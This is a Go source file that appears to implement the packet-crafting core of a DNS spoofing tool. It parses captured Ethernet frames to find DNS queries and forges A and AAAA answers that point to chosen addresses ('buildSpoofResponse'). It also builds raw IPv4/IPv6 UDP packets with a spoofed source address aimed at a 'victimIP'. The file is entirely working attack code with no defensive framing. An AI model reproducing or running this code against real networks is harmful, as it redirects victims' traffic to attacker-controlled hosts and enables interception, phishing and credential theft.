package dns

import (
	"encoding/binary"
	"fmt"
	"net"
	"strings"
)

const (
	dnsPort = 53
	qtA     = 1
	qtPTR   = 12
	qtAAAA  = 28
	classIN = 1
)

type dnsPacket struct {
	SrcIP    net.IP
	DstIP    net.IP
	SrcPort  uint16
	DstPort  uint16
	Payload  []byte
	IPv6     bool
}

func parseDNSFrame(frame []byte) (*dnsPacket, bool) {
	if len(frame) < 14 {
		return nil, false
	}
	switch binary.BigEndian.Uint16(frame[12:14]) {
	case 0x0800:
		return parseDNSIPv4(frame)
	case 0x86DD:
		return parseDNSIPv6(frame)
	default:
		return nil, false
	}
}

func parseDNSIPv4(frame []byte) (*dnsPacket, bool) {
	if len(frame) < 34 {
		return nil, false
	}
	ipOff := 14
	ihl := int(frame[ipOff]&0x0f) * 4
	if ihl < 20 || len(frame) < ipOff+ihl+8 {
		return nil, false
	}
	if frame[ipOff+9] != 17 {
		return nil, false
	}
	udpOff := ipOff + ihl
	srcPort := binary.BigEndian.Uint16(frame[udpOff : udpOff+2])
	dstPort := binary.BigEndian.Uint16(frame[udpOff+2 : udpOff+4])
	if dstPort != dnsPort && srcPort != dnsPort {
		return nil, false
	}
	udpLen := int(binary.BigEndian.Uint16(frame[udpOff+4 : udpOff+6]))
	if udpLen < 8 || len(frame) < udpOff+udpLen {
		return nil, false
	}
	payload := frame[udpOff+8 : udpOff+udpLen]
	if len(payload) < 12 {
		return nil, false
	}
	return &dnsPacket{
		SrcIP:   net.IP(append([]byte{}, frame[ipOff+12:ipOff+16]...)),
		DstIP:   net.IP(append([]byte{}, frame[ipOff+16:ipOff+20]...)),
		SrcPort: srcPort,
		DstPort: dstPort,
		Payload: payload,
	}, true
}

func parseDNSIPv6(frame []byte) (*dnsPacket, bool) {
	if len(frame) < 62 {
		return nil, false
	}
	ipOff := 14
	if frame[ipOff+6] != 17 {
		return nil, false
	}
	payloadLen := int(binary.BigEndian.Uint16(frame[ipOff+4 : ipOff+6]))
	udpOff := ipOff + 40
	if len(frame) < udpOff+8 || payloadLen < 8 {
		return nil, false
	}
	srcPort := binary.BigEndian.Uint16(frame[udpOff : udpOff+2])
	dstPort := binary.BigEndian.Uint16(frame[udpOff+2 : udpOff+4])
	if dstPort != dnsPort && srcPort != dnsPort {
		return nil, false
	}
	if len(frame) < udpOff+payloadLen {
		return nil, false
	}
	payload := frame[udpOff+8 : udpOff+payloadLen]
	if len(payload) < 12 {
		return nil, false
	}
	return &dnsPacket{
		SrcIP:   net.IP(append([]byte{}, frame[ipOff+8:ipOff+24]...)),
		DstIP:   net.IP(append([]byte{}, frame[ipOff+24:ipOff+40]...)),
		SrcPort: srcPort,
		DstPort: dstPort,
		Payload: payload,
		IPv6:    true,
	}, true
}

func isDNSQuery(payload []byte) bool {
	if len(payload) < 12 {
		return false
	}
	if payload[2]&0x80 != 0 {
		return false
	}
	if (payload[2]>>3)&0x0f != 0 {
		return false
	}
	if binary.BigEndian.Uint16(payload[4:6]) != 1 {
		return false
	}
	if binary.BigEndian.Uint16(payload[6:8]) != 0 {
		return false
	}
	if binary.BigEndian.Uint16(payload[8:10]) != 0 {
		return false
	}
	if binary.BigEndian.Uint16(payload[10:12]) != 0 {
		return false
	}
	return true
}

func queryType(payload []byte) (uint16, bool) {
	off := 12
	for off < len(payload) {
		l := int(payload[off])
		if l == 0 {
			off++
			break
		}
		if l&0xc0 == 0xc0 {
			off += 2
			break
		}
		off++
		if off+l > len(payload) {
			return 0, false
		}
		off += l
	}
	if off+4 > len(payload) {
		return 0, false
	}
	qtype := binary.BigEndian.Uint16(payload[off : off+2])
	qclass := binary.BigEndian.Uint16(payload[off+2 : off+4])
	if qclass != classIN {
		return 0, false
	}
	return qtype, true
}

func parseQueryName(payload []byte) (string, bool) {
	if len(payload) < 14 {
		return "", false
	}
	pos := 12
	var labels []string
	for pos < len(payload) {
		l := int(payload[pos])
		if l == 0 {
			break
		}
		if l&0xc0 == 0xc0 {
			break
		}
		pos++
		if pos+l > len(payload) {
			return "", false
		}
		labels = append(labels, string(payload[pos:pos+l]))
		pos += l
	}
	if len(labels) == 0 {
		return "", false
	}
	return strings.Join(labels, "."), true
}

func dnsQueryLen(payload []byte) int {
	off := 12
	for off < len(payload) {
		l := int(payload[off])
		if l == 0 {
			off++
			break
		}
		if l&0xc0 == 0xc0 {
			off += 2
			break
		}
		off++
		if off+l > len(payload) {
			return 0
		}
		off += l
	}
	if off+4 > len(payload) {
		return 0
	}
	return off + 4
}

func buildSpoofResponse(query []byte, qtype uint16, spoofV4 net.IP, spoofV6 net.IP) ([]byte, bool) {
	qLen := dnsQueryLen(query)
	if qLen == 0 {
		return nil, false
	}
	resp := make([]byte, qLen+16)
	copy(resp, query)
	resp[2] = resp[2]&0x78 | 0x80
	resp[3] = resp[3] | 0x80
	binary.BigEndian.PutUint16(resp[6:8], 1)

	switch qtype {
	case qtA:
		if spoofV4 == nil {
			return nil, false
		}
		copy(resp[qLen:], []byte{0xc0, 0x0c, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x3c, 0x00, 0x04})
		copy(resp[qLen+12:], spoofV4.To4())
	case qtAAAA:
		if spoofV6 == nil {
			return nil, false
		}
		copy(resp[qLen:], []byte{0xc0, 0x0c, 0x00, 0x1c, 0x00, 0x01, 0x00, 0x00, 0x00, 0x3c, 0x00, 0x10})
		copy(resp[qLen+12:], spoofV6.To16())
	default:
		return nil, false
	}
	return resp, true
}

func qtypeLabel(qtype uint16) string {
	switch qtype {
	case qtA:
		return "A"
	case qtPTR:
		return "PTR"
	case qtAAAA:
		return "AAAA"
	default:
		return fmt.Sprintf("%d", qtype)
	}
}

func buildIPv4UDPDNS(spoofIP, victimIP net.IP, srcPort, dstPort uint16, dnsPayload []byte) []byte {
	udpLen := 8 + len(dnsPayload)
	ipLen := 20 + udpLen
	pkt := make([]byte, ipLen)

	pkt[0] = 0x45
	binary.BigEndian.PutUint16(pkt[2:4], uint16(ipLen))
	pkt[8] = 64
	pkt[9] = 17
	copy(pkt[12:16], spoofIP.To4())
	copy(pkt[16:20], victimIP.To4())

	binary.BigEndian.PutUint16(pkt[20:22], srcPort)
	binary.BigEndian.PutUint16(pkt[22:24], dstPort)
	binary.BigEndian.PutUint16(pkt[24:26], uint16(udpLen))
	copy(pkt[28:], dnsPayload)

	binary.BigEndian.PutUint16(pkt[10:12], ipChecksum(pkt[:ipLen]))
	return pkt
}

func buildIPv6UDPDNS(spoofIP, victimIP net.IP, srcPort, dstPort uint16, dnsPayload []byte) []byte {
	udpLen := 8 + len(dnsPayload)
	ipLen := 40 + udpLen
	pkt := make([]byte, ipLen)

	pkt[0] = 0x60
	binary.BigEndian.PutUint16(pkt[4:6], uint16(udpLen))
	pkt[6] = 17
	pkt[7] = 64
	copy(pkt[8:24], spoofIP.To16())
	copy(pkt[24:40], victimIP.To16())

	binary.BigEndian.PutUint16(pkt[40:42], srcPort)
	binary.BigEndian.PutUint16(pkt[42:44], dstPort)
	binary.BigEndian.PutUint16(pkt[44:46], uint16(udpLen))
	copy(pkt[48:], dnsPayload)

	return pkt
}

func ipChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}
